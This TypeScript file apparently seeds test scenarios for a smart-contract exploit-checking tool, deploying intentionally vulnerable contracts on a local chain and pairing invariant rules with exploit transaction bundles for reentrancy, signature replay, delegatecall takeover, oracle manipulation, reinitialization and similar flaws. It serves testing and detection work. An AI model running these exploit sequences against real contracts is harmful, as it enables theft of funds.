import { encodeAbiParameters, encodeDeployData, encodeFunctionData, getContractAddress, keccak256, parseEther, type Abi, type Address, type Hex } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import type { BundleCall } from "../src/bundle";
import type { Rule } from "../src/rules";
import { artifact, deploy, KEYS, send, type Chain } from "./chain";

export type Scenario = {
  name: string;
  target: Address;
  rules: Rule[];
  watchTokens: Address[];
  claim: { kind: "invariant"; invariantId: string } | { kind: "balance"; token: string };
  exploit: (attacker: Address) => Promise<BundleCall[]>;
};

const fn = (abi: Abi, functionName: string, args: unknown[] = []) => encodeFunctionData({ abi, functionName, args: args as never });
const asUint = (a: Address) => BigInt(a).toString();

async function creation(name: string, args: unknown[] = []) {
  const a = await artifact("Vulnerable.sol", name);
  return encodeDeployData({ abi: a.abi, bytecode: a.bytecode.object, args: args as never });
}

export async function seed(chain: Chain): Promise<Scenario[]> {
  const owner = privateKeyToAccount(KEYS[0]).address.toLowerCase() as Address;
  const victim = 1;
  const out: Scenario[] = [];

  {
    const v = await deploy(chain, "Vulnerable.sol", "ReinitVault");
    await send(chain, 0, v.address, v.abi, "initialize", [owner]);
    await chain.wallet(0).sendTransaction({ to: v.address, value: parseEther("5") });
    out.push({
      name: "reinitializable owner",
      target: v.address,
      rules: [{ id: "owner-fixed", description: "Ownership never changes", lhs: { call: { target: v.address, fn: "owner() view returns (address)", args: [] } }, op: "==", rhs: { const: asUint(owner) } }],
      watchTokens: [],
      claim: { kind: "invariant", invariantId: "owner-fixed" },
      exploit: async (a) => [{ to: v.address, data: fn(v.abi, "initialize", [a]), value: "0" }, { to: v.address, data: fn(v.abi, "sweep"), value: "0" }],
    });
  }

  {
    const v = await deploy(chain, "Vulnerable.sol", "OpenSetter");
    await chain.wallet(0).sendTransaction({ to: v.address, value: parseEther("3") });
    out.push({
      name: "unauthenticated fee recipient",
      target: v.address,
      rules: [{ id: "fees-to-owner", description: "Fees are paid only to the owner", lhs: { call: { target: v.address, fn: "feeRecipient() view returns (address)", args: [] } }, op: "==", rhs: { const: asUint(owner) } }],
      watchTokens: [],
      claim: { kind: "invariant", invariantId: "fees-to-owner" },
      exploit: async (a) => [{ to: v.address, data: fn(v.abi, "setFeeRecipient", [a]), value: "0" }, { to: v.address, data: fn(v.abi, "withdrawFees"), value: "0" }],
    });
  }

  {
    const v = await deploy(chain, "Vulnerable.sol", "ReentrantBank");
    await send(chain, victim, v.address, v.abi, "deposit", [], parseEther("10"));
    out.push({
      name: "reentrant withdraw",
      target: v.address,
      rules: [{ id: "solvent", description: "Bank holds at least what it owes depositors", lhs: { call: { target: v.address, fn: "solvency() view returns (uint256)", args: [] } }, op: ">=", rhs: { call: { target: v.address, fn: "totalDeposits() view returns (uint256)", args: [] } } }],
      watchTokens: [],
      claim: { kind: "balance", token: "eth" },
      exploit: async (a) => {
        const drainer = await artifact("Vulnerable.sol", "BankDrainer");
        return [
          { create: await creation("BankDrainer", [v.address]), data: "0x", value: parseEther("1").toString() },
          { to: getContractAddress({ from: a, nonce: 0n }), data: fn(drainer.abi, "run"), value: "0" },
        ];
      },
    });
  }

  {
    const v = await deploy(chain, "Vulnerable.sol", "LeakyVault");
    await send(chain, victim, v.address, v.abi, "deposit", [], parseEther("8"));
    out.push({
      name: "redeem without burn",
      target: v.address,
      rules: [{ id: "backed", description: "Assets cover every outstanding share", lhs: { call: { target: v.address, fn: "totalAssets() view returns (uint256)", args: [] } }, op: ">=", rhs: { call: { target: v.address, fn: "totalSupply() view returns (uint256)", args: [] } } }],
      watchTokens: [],
      claim: { kind: "invariant", invariantId: "backed" },
      exploit: async () => [
        { to: v.address, data: fn(v.abi, "deposit"), value: parseEther("1").toString() },
        { to: v.address, data: fn(v.abi, "redeem", [parseEther("1")]), value: "0" },
        { to: v.address, data: fn(v.abi, "redeem", [parseEther("1")]), value: "0" },
      ],
    });
  }

  {
    const signer = privateKeyToAccount(KEYS[2]);
    const v = await deploy(chain, "Vulnerable.sol", "VoucherDesk", [signer.address]);
    await chain.wallet(0).sendTransaction({ to: v.address, value: parseEther("4") });
    const payee = privateKeyToAccount(KEYS[3]).address;
    const amount = parseEther("1");
    const inner = keccak256(encodeAbiParameters([{ type: "address" }, { type: "address" }, { type: "uint256" }], [v.address, payee, amount]));
    const sig = await signer.signMessage({ message: { raw: inner } });
    const r = `0x${sig.slice(2, 66)}` as Hex, s = `0x${sig.slice(66, 130)}` as Hex, vv = parseInt(sig.slice(130, 132), 16);
    const data = fn(v.abi, "redeem", [payee, amount, vv, r, s]);
    await chain.wallet(3).sendTransaction({ to: v.address, data });
    out.push({
      name: "voucher replay",
      target: v.address,
      rules: [],
      watchTokens: [],
      claim: { kind: "balance", token: "eth" },
      exploit: async () => [{ to: v.address, data, value: "0" }, { to: v.address, data, value: "0" }],
    });
  }

  {
    const v = await deploy(chain, "Vulnerable.sol", "UncheckedToken", [10n ** 24n]);
    out.push({
      name: "unchecked transfer underflow",
      target: v.address,
      rules: [],
      watchTokens: [v.address],
      claim: { kind: "balance", token: v.address },
      exploit: async () => [{ to: v.address, data: fn(v.abi, "transfer", [owner, 1n]), value: "0" }],
    });
  }

  {
    const token = await deploy(chain, "Token.sol", "Token");
    const v = await deploy(chain, "Vulnerable.sol", "Relayer");
    await send(chain, 0, token.address, token.abi, "mint", [v.address, 50_000n * 10n ** 6n]);
    out.push({
      name: "arbitrary call",
      target: v.address,
      rules: [{ id: "treasury-kept", description: "Relayer keeps its token treasury", lhs: { call: { target: token.address, fn: "balanceOf(address) view returns (uint256)", args: [v.address] } }, op: ">=", rhs: { const: String(50_000n * 10n ** 6n) } }],
      watchTokens: [token.address],
      claim: { kind: "balance", token: token.address },
      exploit: async (a) => [{ to: v.address, data: fn(v.abi, "relay", [token.address, fn(token.abi, "transfer", [a, 50_000n * 10n ** 6n])]), value: "0" }],
    });
  }

  {
    const v = await deploy(chain, "Vulnerable.sol", "Runner");
    await chain.wallet(0).sendTransaction({ to: v.address, value: parseEther("6") });
    const takeover = await artifact("Vulnerable.sol", "Takeover");
    out.push({
      name: "unauthenticated delegatecall",
      target: v.address,
      rules: [{ id: "owner-fixed", description: "Ownership never changes", lhs: { call: { target: v.address, fn: "owner() view returns (address)", args: [] } }, op: "==", rhs: { const: asUint(owner) } }],
      watchTokens: [],
      claim: { kind: "balance", token: "eth" },
      exploit: async (a) => {
        const lib = getContractAddress({ from: a, nonce: 0n });
        return [
          { create: takeover.bytecode.object, data: "0x", value: "0" },
          { to: v.address, data: fn(v.abi, "run", [lib, fn(takeover.abi, "pwn")]), value: "0" },
          { to: v.address, data: fn(v.abi, "sweep"), value: "0" },
        ];
      },
    });
  }

  {
    const token = await deploy(chain, "Token.sol", "Token");
    const pool = await deploy(chain, "Vulnerable.sol", "SpotPool", [token.address], { value: parseEther("10") });
    await send(chain, 0, token.address, token.abi, "mint", [pool.address, 1000n * 10n ** 6n]);
    const lender = await deploy(chain, "Vulnerable.sol", "SpotLender", [token.address, pool.address]);
    await chain.wallet(0).sendTransaction({ to: lender.address, value: parseEther("100") });
    out.push({
      name: "spot price oracle",
      target: lender.address,
      rules: [],
      watchTokens: [token.address],
      claim: { kind: "balance", token: "eth" },
      exploit: async () => [{ create: await creation("PumpAndBorrow", [pool.address, lender.address, token.address]), data: "0x", value: parseEther("50").toString() }],
    });
  }

  {
    const v1 = await deploy(chain, "Vulnerable.sol", "VaultV1");
    const proxy = await deploy(chain, "Vulnerable.sol", "Proxy", [v1.address]);
    await send(chain, 0, proxy.address, v1.abi, "init", [owner]);
    await chain.wallet(0).sendTransaction({ to: proxy.address, value: parseEther("12") });
    const v2 = await deploy(chain, "Vulnerable.sol", "VaultV2");
    await send(chain, 0, proxy.address, proxy.abi, "upgradeTo", [v2.address]);
    out.push({
      name: "upgrade drops owner check",
      target: proxy.address,
      rules: [{ id: "assets-floor", description: "Vault assets never fall below the 12 ETH reserve", lhs: { call: { target: proxy.address, fn: "totalAssets() view returns (uint256)", args: [] } }, op: ">=", rhs: { const: parseEther("12").toString() } }],
      watchTokens: [],
      claim: { kind: "invariant", invariantId: "assets-floor" },
      exploit: async (a) => [{ to: proxy.address, data: fn(v2.abi, "withdraw", [a, parseEther("12")]), value: "0" }],
    });
  }

  return out;
}
